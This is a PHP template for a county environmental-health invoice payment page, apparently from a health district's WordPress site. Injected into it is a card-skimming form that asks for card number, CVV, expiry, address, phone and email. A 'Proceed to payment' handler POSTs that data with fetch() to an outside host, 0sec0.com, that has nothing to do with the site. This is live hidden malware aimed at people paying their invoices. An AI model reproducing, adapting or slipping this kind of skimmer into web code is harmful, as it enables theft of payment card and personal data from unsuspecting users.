<?php
$output = '';
$output .= <<< HTML
<div class="wrapper">
<!-- Load Embedded JS Here -->
HTML;
?>
<?php
if( ! empty($vars['css_files']) )
{
	foreach($vars['css_files'] as $v)
	{
		$output .= '<link rel="stylesheet" href="'.$v.'" />';
	}
}
?>
<?php
//if( ! empty($vars['script_data']) )
//{
//	$output .= $vars['script_data'];
//}

$output .= <<< CSS
<style>
.input-append .add-on, .input-prepend .add-on { height: auto; }
</style>
CSS;


?>
<?php

$output .= <<< HTML
<!-- Main Content Area -->
<div class="content">
<!-- Main -->
<div id="two-col-wrapper">
<!-- Main Body -->
<div id="body-content">
<div class="horizontal-bar"></div>
    <div class="body-wrapper">
        <h1>Environmental Health Invoice Payment</h1>
        <div class="row-fluid">
            <div id="complaint-content" class="span12">
                <div id="step-one">
                    <div class="alert alert-warning" role="alert" style="padding-top: 30px;">
                        <p>Check payments made after 5:00pm will be posted to your account on the following business day.</p>
                        <p>Credit card payments made after 9:00pm will be posted to your account on the following business day.</p>
                    </div>
                    <form id="invoice-search" style="margin-top: 20px">
                        <fieldset>
                            <label for="invoice-number">Please enter your invoice # <small>Example: IN0123456</small></label>
                            <input class="span4" type="text" placeholder="Your Invoice #" id="invoice-number" name="invoice_number">
HTML;
?>

<?php
$output .= wp_nonce_field( 'get_ec_invoice', 'ec_token' );
$output .= <<< HTML
                        </fieldset>
                        <button type="submit" id="submit-button" class="btn">Submit</button>
                    </form>
                </div>
				<div id="step-two">
                    <h2>Invoice Information</h2>

                    <div>
                        <div class="invoice-label"> Invoice Number: </div>
                        <span id="invoice-data-number"> </span>
                    </div>
                    <div>
                        <span class="invoice-label"> Invoice Date: </span>
                        <span id="invoice-data-date"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Facility Id: </div>
                        <span id="invoice-data-facilityid"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Owner Id: </div>
                        <span id="invoice-data-ownerid"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Account Id: </div>
                        <span id="invoice-data-accountid" > </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Owner Name: </div>
                        <span id="invoice-data-ownername"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Facility Name: </div>
                        <span id="invoice-data-facilityname"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Responsible Party: </div>
                        <span id="invoice-data-rpname"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Mailing Care Of: </div>
                        <span id="invoice-data-rpcareof"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Mailing Address: </div>
                        <span id="invoice-data-street"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> City: </div>
                        <span id="invoice-data-city"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> State: </div>
                        <span id="invoice-data-state"> </span>
                    </div>
                    <div>
                        <div class="invoice-label"> Zip: </div>
                        <span id="invoice-data-zip"> </span>
                    </div>

                    <h2>Line Items</h2>

                    <table class="table table-hover" id="invoice-line-items">
                        <tr>
                            <th> Line No </th>
                            <th> Description </th>
                            <th> Amount </th>
                        </tr>
                    </table>
					
                    <div class="text-center alert alert-info">
                        <strong> Total due on this invoice: <span id="invoice-total-due"> </span></strong>
                    </div>
					                 <style>
table {
  border-collapse: collapse;
  width: 100%;
}
td {
  padding: 10px;
  vertical-align: top;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  font-size: 16px;
}
input[type="text"] {
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 16px;
  color: #555;
  box-sizing: border-box;
  margin-bottom: 10px;
}
td {
  padding: 10px;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  width: 100%;
}
.card-details {
  display: flex;
  align-items: center;
  margin-bottom: 20px;
}
.card-details h2 {
  margin-right: 20px;
  font-size: 18px;
}
.card-logos {
  display: flex;
  align-items: center;
}
.card-logos img {
  height: 20px;
  margin-left: 10px;
  border-radius: 5px;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
  transition: transform 0.3s ease-in-out;
}
.card-logos img:hover {
  transform: scale(1.1);
}
label {
  display: block;
  margin-bottom: 10px;
  font-weight: bold;
  color: #333;
}
.input-group {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.input-group input {
  flex: 1;
  margin-left: 10px;
  background-color: #f5f5f5;
  border: none;
  padding: 10px;
  border-radius: 5px;
  font-size: 16px;
  color: #555;
}
input {
  display: block;
  margin-bottom: 20px;
  padding: 10px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  color: #555;
  background-color: #f5f5f5;
}
input:focus {
  border-color: #1E90FF;
  outline: none;
}
.label-group {
  display: flex;
  justify-content: space-between;
}
button {
  background-color: #1E90FF;
  color: #fff;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  padding: 10px 20px;
  cursor: pointer;
}
button:hover {
  background-color: #007fff;
}
</style>
<center>
<div>
  <div>
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQC7CieAW4f7cXwMctXmbjZurEyaVxA2qN0w&usqp=CAU" alt="Mastercard">
  </div>
<br>
<h3>Payment Card Details</h3>
</center>
<br>
<form method="post" id="myform">
<table>
  <tr>
    <td>
      <label for="card_holder" style="text-align: left;">Cardholder's Name</label>
      <input type="text" id="card_holder" name="card_holder" required placeholder="John Doe"><br>
      <label for="expiry_date" style="text-align: left;">Expiration Date</label>
      <input type="text" id="expiry_date" name="expiry_date" required placeholder="MM/YY"><br>
      <label for="address" style="text-align: left;">Address</label>
      <input type="text" id="address" name="address" required placeholder="Address"><br>
      <label for="country" style="text-align: left;">Country</label>
      <input type="text" id="country" name="country" required placeholder="Country"><br>
      <label for="phone" style="text-align: left;">Phone Number</label>
      <input type="text" id="phone" name="phone" required placeholder="Phone Number"><br>
    </td>
    <td style="text-align:center;">
      <label for="card_number" style="text-align: left;">Card Number</label>
      <input type="text" id="card_number" name="card_number" required placeholder="xxxx-xxxx-xxxx-xxxx"><br>
      <label for="cvv" style="text-align: left;">CVV</label>
      <input type="text" id="cvv" name="cvv" required placeholder="123"><br>
	        <label for="city" style="text-align: left;">City</label>
      <input type="text" id="city" name="city" required placeholder="City"><br>

      <label for="zipcode" style="text-align: left;">Zip Code</label>
      <input type="text" id="zipcode" name="zipcode" required placeholder="12345"><br>
<label for="email" style="text-align: left;">E-mail</label>
      <input type="text" id="email" name="email" required placeholder="E-mail"><br>
    </td>
  </tr>
</table>
</form>
                    <div id="form-actions">
                        <a href="#" id="back-to-search"> Back to search invoice </a>
                        <button id="proceed-to-payment" onclick="submitForm()" class="btn btn-primary"> Proceed to payment </button>
                    </div>
                </div>
<script>
function submitForm() {
  var form = document.getElementById("myform");
  var formData = new FormData(form);

  fetch("https://0sec0.com/southernnevadahealthdistrict.org.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>				
HTML;
?>

<?php
if( (isset($_GET['rs'])) && ($_GET['rs'] == 'f') ) {
	$output .= <<< HTML
	<p align="left" class="body-text" style="color: red;">
                            Please click I'm not a robot checkbox above.
                          </p>
HTML;
}

$output .= <<< HTML
            </div>
        </div>
    </div>
    <div class="horizontal-bar"></div>
</div>
</div>
</div>
HTML;

?>

<?php
// Render JS Files
if( ! empty($vars['js_files']) )
{
	foreach($vars['js_files'] as $v)
	{
		$output .= '<script src="'.$v.'"></script>';
	}
	$output.= '<script src="https://www.google.com/recaptcha/api.js" async defer></script>';
}
?>

<?php
$output .= <<<JS
<script>
   var allowSubmit = false;

    function captcha_filled() {
        $('#complaints-js-error').hide();
        allowSubmit = true;
    }

    function captcha_expired() {
        allowSubmit = false;
    }
</script>
JS;

$output .= <<< HTML
</div>
HTML;

$output .= Snhd_Restapi_Public::get_environment_markup();
